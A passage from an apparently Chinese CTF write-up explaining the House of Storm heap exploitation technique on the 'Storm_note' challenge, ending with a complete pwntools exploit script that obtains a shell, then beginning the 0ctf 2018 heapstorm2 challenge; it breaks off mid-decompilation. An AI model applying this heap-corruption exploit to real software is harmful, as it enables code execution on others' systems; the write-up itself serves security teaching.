<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x508)</span></span>#<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x508)</span></span>#<span class="hljs-number">4</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">5</span><br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">6</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p>然后构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500)</span></span>) <br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500)</span></span>) <br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png?ynotemdtimestamp=1663776442613" alt="img"><br>然后再free(1)，利用off-by-null编辑chunk_0，将chunk_1的size从0x510改为0x500，由于刚才构造的两个fake chunk，此时堆块已合并</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">0</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x18)</span></span>#off-by-null改写chunk1的size为<span class="hljs-number">0</span>x500<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再申请两个chunk，使之恢复正常，之后free掉chunk_1和chunk_2，使之合并</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x4d8)</span></span>#<span class="hljs-number">7</span>  <br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>    <br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再次申请两个特定大小的chunk即可实现chunk7可以控制原unsortedbin chunk 0x4f1的bk指针，即我们可以用chunk_7来控制chunk_2(unsortedbin chunk),为便于理解我们可查看一下note这个存放全局chunk mem指针的数组</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x30)</span></span>#<span class="hljs-number">1</span> 此时chunk1可以控制原unsortedbin chunk  <span class="hljs-number">0</span><span class="hljs-built_in">x4f1</span>(chunk_2)的bk指针<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x4e0)</span></span>#<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">3</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x18)</span></span><span class="hljs-selector-id">#off</span> by null<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">4</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x4d8)</span></span>#<span class="hljs-number">8</span> <span class="hljs-number">0</span>x5a0<br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x40)</span></span>#<span class="hljs-number">4</span> <span class="hljs-number">0</span>x580<br></code></pre></td></tr></tbody></table></figure>

<p>之后free(2)，放入unsortedbin</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>    <br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png?ynotemdtimestamp=1663776442613" alt="img"><br>再申请回来0x4e8（0x4f0）大小的chunk，使0x4e0大小的chunk进入largebin</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4e8)      # put <span class="hljs-built_in">chunk8</span>(<span class="hljs-number">0</span>x5c0) to largebin<br><br><span class="hljs-built_in">dbg</span>()<br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再次free(2)，构造一个unsortedbin chunk和一个largebin chunk</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> <span class="hljs-selector-id">#put</span> chunk2 to unsortedbin<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后利用刚才构造的堆块重叠，修改unsortedbin chunk的bk指针为目标地址（target-0x20）</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> = <span class="hljs-number">0</span>xabcd0100<br><span class="hljs-attribute">fake_chunk</span> = target - <span class="hljs-number">0</span>x20<br><br><span class="hljs-attribute">payload</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4f1) # size<br><span class="hljs-attribute">payload</span> += p64(<span class="hljs-number">0</span>) + p64(fake_chunk)      # bk<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">7</span>,payload)<br><br><span class="hljs-attribute">dbg</span>()<br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后利用刚才构造的堆块重叠，修改largebin chunk的bk指针和bk_nextsize指针分别为fake_chunk+8，和fake_chunk-0x18-5</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload2 = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x4e1) <span class="hljs-selector-id">#size</span><br>payload2 += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk+<span class="hljs-number">8</span>)   <br>payload2 += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)<span class="hljs-selector-id">#mmap</span><br><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">8</span>,payload2)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png?ynotemdtimestamp=1663776442613" alt="img"><br>然后申请0x40（0x50）大小的chunk，可以看到在目标地址处0xabcd00e0成功伪造fake chunk，size为0x56，巧妙的实现victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x40)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后就是把0xABCD0100处的0x30个字节改为已知数，然后获得shell</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload = <span class="hljs-string">'\x00'</span>*(<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x30)<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>,payload)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png?ynotemdtimestamp=1663776442613" alt="img"></p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sla</span><span class="hljs-params">(<span class="hljs-string">'Choice: '</span>,<span class="hljs-string">'666'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">s</span><span class="hljs-params">(p64(<span class="hljs-number">0</span>)</span></span>*<span class="hljs-number">6</span>)<br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-comment">#context(endian='little',os='linux',arch='amd64',log_level='debug')</span><br><span class="hljs-attribute">sh</span> = process('./Storm_note')<br><br><span class="hljs-attribute">s</span>       = lambda data               :sh.send(data)<br><span class="hljs-attribute">sa</span>      = lambda delim,data         :sh.sendafter(delim, data)<br><span class="hljs-attribute">sl</span>      = lambda data               :sh.sendline(data)<br><span class="hljs-attribute">sla</span>     = lambda delim,data         :sh.sendlineafter(delim, data)<br><span class="hljs-attribute">r</span>       = lambda num=<span class="hljs-number">4096</span>           :sh.recv(num)<br><span class="hljs-attribute">ru</span>      = lambda delims		    :sh.recvuntil(delims)<br><span class="hljs-attribute">itr</span>     = lambda                    :sh.interactive()<br><span class="hljs-attribute">uu32</span>    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,'\<span class="hljs-number">0</span>'))<br><span class="hljs-attribute">uu64</span>    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,'\<span class="hljs-number">0</span>'))<br><span class="hljs-attribute">leak</span>    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))<br><span class="hljs-attribute">lg</span>      = lambda address,data       :log.success('%s: '%(address)+hex(data))<br><span class="hljs-attribute">def</span> dbg():<br>        <span class="hljs-attribute">gdb</span>.attach(sh)<br>        <span class="hljs-attribute">pause</span>()<br><br><br><span class="hljs-attribute">def</span> add(size):<br>  <span class="hljs-attribute">sla</span>('Choice','<span class="hljs-number">1</span>')<br>  <span class="hljs-attribute">sla</span>('?',str(size))<br><br><span class="hljs-attribute">def</span> edit(index,text):<br>  <span class="hljs-attribute">sla</span>('Choice','<span class="hljs-number">2</span>')<br>  <span class="hljs-attribute">sla</span>('?',str(index))<br>  <span class="hljs-attribute">sa</span>('Content',text)<br><br><span class="hljs-attribute">def</span> free(index):<br>  <span class="hljs-attribute">sla</span>('Choice','<span class="hljs-number">3</span>')<br>  <span class="hljs-attribute">sla</span>('?',str(index))<br><span class="hljs-comment">#---------------布置chunk-------------------------#</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">0</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">1</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">2</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">3</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">5</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">6</span><br><br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">1</span>,'a'*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500)) <br><span class="hljs-attribute">edit</span>(<span class="hljs-number">4</span>,'a'*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500)) <br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#----------------准备 unsorted chunk-----------------------#</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">0</span>,'a'*<span class="hljs-number">0</span>x18)#<span class="hljs-literal">off</span>-by-null改写chunk1的size为<span class="hljs-number">0</span>x500<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">1</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8)#<span class="hljs-number">7</span>  <br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>)    <br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#recover</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x30)#<span class="hljs-number">1</span> 此时chunk7可以控制原 （unsortedbin chunk  <span class="hljs-number">0</span>x4f1）的bk指针<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e0)#<span class="hljs-number">2</span><br><span class="hljs-comment">#-------------------准备 large chunk-----------------------------------#</span><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">3</span>,'a'*<span class="hljs-number">0</span>x18)#<span class="hljs-literal">off</span> by null<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8)#<span class="hljs-number">8</span> <span class="hljs-number">0</span>x5a0<br><span class="hljs-attribute">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">5</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x40)#<span class="hljs-number">4</span> <span class="hljs-number">0</span>x580<br><br> <span class="hljs-comment">#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>)    #unsortedbin-&gt; chunk2 -&gt; chunk5(chunk8)(<span class="hljs-number">0</span>x5c0)    which size is largebin FIFO<br> <br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8)      # put chunk8(<span class="hljs-number">0</span>x5c0) to largebin<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>) #put chunk2 to unsortedbin<br><br><span class="hljs-comment">#dbg()</span><br> <span class="hljs-comment">#--------------修改他们是的满足条件进行 house of strom------------------------------#</span><br><span class="hljs-attribute">target</span> = <span class="hljs-number">0</span>xabcd0100<br><span class="hljs-attribute">fake_chunk</span> = target - <span class="hljs-number">0</span>x20<br><br><span class="hljs-attribute">payload</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4f1) # size<br><span class="hljs-attribute">payload</span> += p64(<span class="hljs-number">0</span>) + p64(fake_chunk)      # bk<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">7</span>,payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload2</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4e1) #size<br><span class="hljs-attribute">payload2</span> += p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>)   <br><span class="hljs-attribute">payload2</span> += p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)#mmap<br><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">8</span>,payload2)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x40)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload</span> = '\x00'*(<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x30)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">2</span>,payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">sla</span>('Choice: ','<span class="hljs-number">666</span>')<br><span class="hljs-attribute">s</span>(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>)<br><span class="hljs-attribute">itr</span>()<br></code></pre></td></tr></tbody></table></figure>

<h3 id="0ctf-2018-heapstorm2"><a href="#0ctf-2018-heapstorm2" class="headerlink" title="0ctf_2018_heapstorm2"></a>0ctf_2018_heapstorm2</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>同样是保护全开，</p>
<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>实现四个功能，增删改查</p>
<figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs csharp">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">main</span>(<span class="hljs-params">__int64 a1, <span class="hljs-built_in">char</span> **a2, <span class="hljs-built_in">char</span> **a3</span>)</span><br>{<br>  __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]   	//v4=0x13370800</span><br><br>  v4 = sub_BE6();<br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    <span class="hljs-keyword">switch</span> ( chioce(a1, a2) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1L</span>L:<br>        a1 = v4;<br>        <span class="hljs-keyword">add</span>(v4);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2L</span>L:<br>        a1 = v4;<br>        up(v4);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3L</span>L:<br>        a1 = v4;<br>        